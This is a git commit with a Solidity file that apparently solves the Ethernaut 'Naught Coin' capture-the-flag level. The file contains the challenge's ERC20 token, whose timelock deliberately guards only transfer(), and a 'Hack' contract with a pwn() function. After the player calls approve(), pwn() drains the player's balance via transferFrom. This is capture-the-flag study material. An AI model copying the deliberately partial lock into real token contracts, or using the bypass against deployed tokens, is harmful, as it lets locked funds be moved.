2437b08c0adf96de09d732439016bcfbed27caa8
darkodi <darko.deuric@ethernal.tech>
2023-12-25 11:02:27 +0100

    Naught coin erc20

---
+++ NaughtCoin.sol
@@ -0,0 +1,65 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+
+contract NaughtCoin is ERC20 {
+    // string public constant name = 'NaughtCoin';
+    // string public constant symbol = '0x0';
+    // uint public constant decimals = 18;
+    uint public timeLock = block.timestamp + 10 * 365 days;
+    uint256 public INITIAL_SUPPLY;
+    address public player;
+
+    constructor(address _player) ERC20("NaughtCoin", "0x0") {
+        player = _player;
+        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));
+        // _totalSupply = INITIAL_SUPPLY;
+        // _balances[player] = INITIAL_SUPPLY;
+        _mint(player, INITIAL_SUPPLY);
+        emit Transfer(address(0), player, INITIAL_SUPPLY);
+    }
+
+    function transfer(
+        address _to,
+        uint256 _value
+    ) public override lockTokens returns (bool) {
+        // lockTokens prevents movement of tokens until the time lock expires
+        // there are other methods to move tokens (approve - set an allowance for another address, transferFrom - move the approved amount of tokens) 
+        // which are not overriden or restricted in this contract
+        super.transfer(_to, _value);
+    }
+
+    // Prevent the initial owner from transferring tokens until the timelock has passed
+    modifier lockTokens() {
+        if (msg.sender == player) {
+            require(block.timestamp > timeLock);
+            _;
+        } else {
+            _;
+        }
+    }
+}
+
+interface INaughtCoin {
+    function player() external view returns (address);
+}
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
+
+// 1. Deploy Hack contract
+// 2. Load (At address) IERC20 with NaughtCoin instance
+//    Check balanceOf (your metamask address - player) > 0
+//    coin.approve(hack, amount)
+// 3. pwn() -> transfers amount from palyer to hack
+contract Hack {
+    function pwn(IERC20 coin) external {
+        address player = INaughtCoin(address(coin)).player();
+        uint256 bal = coin.balanceOf(player);
+        coin.transferFrom(player, address(this), bal);
+    }
+}
